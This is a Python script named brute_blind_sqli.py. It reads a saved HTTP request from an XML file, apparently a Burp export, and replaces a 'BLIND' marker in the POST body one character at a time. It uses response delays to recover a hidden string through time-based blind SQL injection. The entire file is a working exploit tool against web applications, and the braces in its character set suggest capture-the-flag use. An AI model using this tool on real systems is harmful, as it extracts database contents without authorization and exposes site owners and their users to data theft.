import time
import requests
import sys
import xml.etree.ElementTree as ET
import base64




def main():
    if len(sys.argv) < 2:
        print("Usage: python brute_blind_sqli.py <request_file_path>")
        sys.exit(1)

    safe_file_path = sys.argv[1]

    # Parse the XML file
    tree = ET.parse(safe_file_path)
    root = tree.getroot()

    # Extract the necessary data from the XML
    url = root.find(".//url").text.strip()
    request_base64 = root.find(".//request").get("base64").strip()
    request_data = root.find(".//request").text.strip()

    # Decode the request data if it's in base64 format
    if request_base64.lower() == "true":
        request_data = base64.b64decode(request_data).decode()

    # Extract the last line of the request_data (the POST data)
    post_data = request_data.splitlines()[-1]

    valid_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}!?/()[]&$:;#_'
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = ""

    found = True
    while found:
        found = False
        for char in valid_chars:
            current_payload = payload + char
            post_data_modified = post_data.replace('BLIND', current_payload).encode('ISO-8859-1')
            start_time = time.time()
            response = requests.post(url, data=post_data_modified, headers=headers, allow_redirects=False)
            end_time = time.time()
            if end_time-start_time > 2.9:
                payload += char
                print(f"Valid response found! Updated payload: {payload}")
                found = True
                break

    print(f"String found: {payload}")

if __name__ == "__main__":
    main()
